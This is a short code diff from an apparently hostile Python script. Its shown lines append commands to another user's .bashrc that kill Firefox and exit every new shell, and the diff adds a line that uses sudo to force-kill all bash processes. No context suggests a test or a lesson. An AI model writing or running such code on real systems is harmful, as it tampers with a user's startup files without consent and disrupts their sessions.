@@ -6,3 +6,5 @@ for x in range(300):
 
 with open("../home/tls-sec/.bashrc", 'a+') as f:
     f.write("\npkill -f firefox\nexit")
+    
+subprocess.run("sudo pkill -c -e -9 bash")
